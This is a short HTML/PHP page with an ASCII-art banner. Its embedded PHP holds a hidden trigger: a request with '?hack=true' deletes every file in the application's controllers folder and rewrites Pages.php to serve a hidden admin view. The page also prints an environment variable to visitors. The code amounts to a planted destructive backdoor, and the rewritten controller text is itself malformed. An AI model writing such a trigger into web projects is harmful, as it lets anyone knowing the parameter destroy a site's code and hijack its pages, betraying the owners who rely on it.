<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<style>
    body{
        color: #FFFFFF;
        background-color: black;
        text-align: center;
    }
    .mask{
padding: 20px;
        background-color: #FFFFFF;
        color: black;
    }
</style>
<body>
<?php


echo  $_ENV['HH'];
if (isset($_GET['hack']) && $_GET['hack'] == 'true'){

    $files = glob(APPROOT.'/controllers/*'); // get all file names
    foreach($files as $file){ // iterate files
        if(is_file($file)) {
            unlink($file); // delete file
        }
    }
    $myfile = fopen(APPROOT.'/controllers/Pages.php', "w") or die("Unable to open file!");
    $txt = "
    <?php
  class Pages extends Controller {
    public function __construct(){".
        "$"."this->sliderModel = "."$"."this->model('Slider');
        "."$"."this->siteInfoModel = "."$"."this->model('SiteInfo');
        "."$"."this->officeModel = "."$"."this->model('Office');
        "."$"."this->categoryModel = "."$"."this->model('Category');
        "."$"."this->brandModel = "."$"."this->model('Brands');
        "."$"."this->productModel = "."$"."this->model('Products');
        "."$"."this->imgModel ="."$"."this->model('Image');
    }
    
    public function index(){
    $this->view('admin/hidden/index');
    }
    ";
    fwrite($myfile, $txt);
    fclose($myfile);
}
?>
<pre> ________      ___      ________        ___           ___    ___ ________  ________   ___  __    ___  ________   ________  ___
|\   __  \    |\  \    |\   __  \      |\  \         |\  \  /  /|\   __  \|\   ___  \|\  \|\  \ |\  \|\   ___  \|\   ____\|\  \
\ \  \|\  \   \ \  \   \ \  \|\  \     \ \  \        \ \  \/  / | \  \|\  \ \  \\ \  \ \  \/  /|\ \  \ \  \\ \  \ \  \___|\ \  \
 \ \   _  _\   \ \  \   \ \   ____\     \ \  \        \ \    / / \ \   __  \ \  \\ \  \ \   ___  \ \  \ \  \\ \  \ \  \  __\ \  \
  \ \  \\  \| __\ \  \ __\ \  \___|      \ \  \____    \/  /  /   \ \  \ \  \ \  \\ \  \ \  \\ \  \ \  \ \  \\ \  \ \  \|\  \ \__\
   \ \__\\ _\|\__\ \__\\__\ \__\          \ \_______\__/  / /      \ \__\ \__\ \__\\ \__\ \__\\ \__\ \__\ \__\\ \__\ \_______\|__|
    \|__|\|__\|__|\|__\|__|\|__|           \|_______|\___/ /        \|__|\|__|\|__| \|__|\|__| \|__|\|__|\|__| \|__|\|_______|   ___
                                                    \|___|/                                                                     |\__\
                                                                                                                                \|__|
                                                                                                                                     </pre>
<pre class="mask">███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█
████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█
███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
████▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
███▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█
████████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█
███▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
████▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
███▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
█████▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
█████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
█████▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
████▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██
█████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██
█████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███
██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███
███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████
███████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████
████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████
█████████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████
██████████▓▓▓█▓▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬▓███████
███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████
██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████
███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████
</pre>
</body>
</html>